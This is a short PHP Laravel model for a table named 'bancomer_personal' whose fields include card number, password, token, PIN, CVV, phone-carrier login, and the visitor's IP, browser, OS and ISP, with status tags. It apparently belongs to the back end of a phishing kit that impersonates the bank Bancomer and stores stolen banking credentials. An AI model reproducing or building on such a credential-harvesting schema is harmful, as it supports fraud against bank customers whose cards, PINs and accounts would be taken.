<?php

namespace App\bancomer;

use Illuminate\Database\Eloquent\Model;

class Personal extends Model
{
	//Con esto le decimos al modelo con que tabla trabajar
	protected $table = 'bancomer_personal';

    protected $fillable = [
        'n_tarjeta','nombre','contrasena','token','nip','cvv','compania','telefono','mi_telcel','ip','navegador','os','isp','estatus'
    ];

    public function etiquetas() {
    	return $this->belongsToMany('App\bancomer\Etiqueta','tag_bancomer_personal');
	}
}
